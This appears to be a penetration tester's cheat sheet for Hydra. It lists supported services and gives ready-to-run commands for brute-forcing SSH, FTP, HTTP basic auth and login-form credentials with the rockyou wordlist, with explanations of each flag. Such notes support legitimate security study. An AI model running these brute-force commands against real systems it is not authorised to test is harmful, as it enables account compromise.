# Hydra :	Credentials Bruteforcing tool

## Bruteforceable services :

Asterisk, AFP, Cisco AAA, Cisco auth, Cisco enable, CVS, Firebird, FTP,  HTTP-FORM-GET, HTTP-FORM-POST, HTTP-GET, HTTP-HEAD, HTTP-POST, HTTP-PROXY, HTTPS-FORM-GET, HTTPS-FORM-POST, HTTPS-GET, HTTPS-HEAD, HTTPS-POST, HTTP-Proxy, ICQ, IMAP, IRC, LDAP, MS-SQL, MYSQL, NCP, NNTP, Oracle Listener, Oracle SID, Oracle, PC-Anywhere, PCNFS, POP3, POSTGRES, RDP, Rexec, Rlogin, Rsh, RTSP, SAP/R3, SIP, SMB, SMTP, SMTP Enum, SNMP v1+v2+v3, SOCKS5, SSH (v1 and v2), SSHKEY, Subversion, Teamspeak (TS2), Telnet, VMware-Auth, VNC and XMPP.


## SSH Example : 
```bash
hydra -l <username> -P /home/neo/Pentest/rockyou.txt -t 4 <IP> ssh
```
**Flags**
- -l 		single username
- -P 		password list
- -t 		specifies the number of threads

## FTP Example
```bash
hydra -l <user> -P /home/neo/Pentest/rockyou.txt ftp://<targetIP>
```

## HTTP(s) Basic Auth

HTTP basic auth can be enabled in `Apache2` through `/etc/apache2/.htpasswd.conf` file and `htpasswd` bash command

![](images/Pasted%20image%2020240521164854.png)

The request sent when typing credentials
```
GET / HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Authorization: Basic YWRtaW46YWRtaW4= # b64(admin:admin)
Te: trailers
Connection: close
```

**Hydra command** :
- Don't forget to edit the method `http-get` or `https-get`
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt localhost -s 443 https-get
```

## Post Web Form Example 
```bash
hydra -l <username> -P /home/neo/Pentest/rockyou.txt <targetip> http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V -I
```

- -l 		single username
- -P 		password list
- http-post-form 	Indicate the type of form
- /login.php	the login page PATH 
- :username	the form field where username is entered (html input name je crois)
- ^USER^ 		tells hydra to use the username
- password	the form field where password is entered (html input name je crois)
- ^PASS^		tells hydra to use the password list supplied earlier
- Login failed	is the login failure message that the form returns
- F=incorrect 	if the word "incorrect" appears on the page, it's incorrect
- -V 		Verbose of each attempt
